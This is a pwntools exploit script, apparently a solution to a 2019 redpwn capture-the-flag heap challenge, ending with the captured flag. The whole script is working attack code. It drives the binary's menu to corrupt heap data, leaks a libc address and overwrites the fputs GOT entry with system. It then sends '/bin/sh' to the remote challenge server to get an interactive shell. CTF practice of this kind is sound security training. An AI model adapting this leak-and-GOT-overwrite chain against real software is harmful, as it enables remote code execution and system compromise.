from pwn import *


binpath = './dennis'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

libc_file = './libc-2.23.so'

elf = ELF(binpath)
libc = elf.libc

gdbscript = '''
gef
set $spm=0x804b050

b greet
b writ
b yeet
b eat
b delet
b repeat
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('chall.2019.redpwn.net', 4006)
# io = remote('localhost', 4088)


def greet(size):
    io.recvuntil('ommand me: ')
    io.sendline('1')

    io.recvuntil(' : ')
    io.sendline(str(size))


def writ(size):
    io.recvuntil('ommand me: ')
    io.sendline('2')

    io.recvuntil(' : ')
    io.sendline(str(size))

    data = io.recvuntil('C')
    return data[:-1]


def yeet():
    io.recvuntil('ommand me: ')
    io.sendline('3')


def eat(data):
    io.recvuntil('ommand me: ')
    io.sendline('4')

    io.recvuntil('Pizza: ')
    io.sendline(data)


def delet():
    io.recvuntil('ommand me: ')
    io.sendline('5')

def repeat(data):
    io.recvuntil('ommand me: ')
    io.sendline('6')

    io.recvuntil('repeat\n')
    io.sendline(data)


addr_spm = 0x804b050

greet(0x58)
greet(0x28)

payload = ''
payload += p32(0x08080808)
payload += p32(addr_spm-(0x3))
eat(payload)

yeet()
delet()

data = writ(0x4)
addr_libc = u32(data) - 0x1b07b0

print "addr_libc = 0x{:x}".format(addr_libc)

greet(0x38)
payload = ''
payload += p32(elf.got['fputs'])
payload += p32(addr_spm)
eat(payload)

yeet()

eat(p32(addr_libc + libc.symbols['system']))

repeat('/bin/sh')

io.interactive()

# flag{1f_y0u'r3_r3ad1ng_th1s,_t3ll_0rg4niz3r_TPA_t0_d0_h1s_h0mew0rk}
